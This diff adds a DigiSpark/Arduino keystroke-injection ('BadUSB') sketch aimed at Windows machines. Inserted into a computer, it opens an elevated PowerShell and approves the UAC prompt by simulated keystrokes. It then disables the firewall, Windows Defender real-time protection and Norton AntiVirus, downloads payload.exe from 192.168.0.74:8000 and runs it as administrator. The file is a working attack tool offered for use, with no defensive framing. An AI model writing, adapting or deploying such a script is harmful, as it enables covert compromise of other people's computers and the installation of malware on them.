@@ -1,0 +1,53 @@
+#include <DigiKeyboard.h>
+#include "DigiKeyboard.h"
+
+void setup() {
+ pinMode(1, OUTPUT);           //LED on Model A 
+}
+
+void loop() {
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);   //OPEN RUN
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);    //run powershell as an administrator
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");     //DISABLEING FIREWALL
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");     //DISABLEING WINDOWS DEFENDER REAL TIME PROTECTION
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("Stop-Service -Name Norton AntiVirus");        //DISABLING ANTI-VIRUS, YOU CAN ADD NAME ACCORDING TO YOUR NEEDS
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("New-Item -ItemType Directory -Path \"C:\\temp\"");       //Create a directory named (temp) to save the downloaded file
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.println("Invoke-WebRequest -Uri \"http://192.168.0.74:8000/payload.exe\" -OutFile \"C:/temp/payload.exe\"");    //Download the payload file from the given server
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Start-Process \"C:/temp/payload.exe\" -Verb RunAs");     //Run the downloaded file as administrator
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  digitalWrite(1, HIGH);                 //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+
+  for (;;) {
+  }
+}
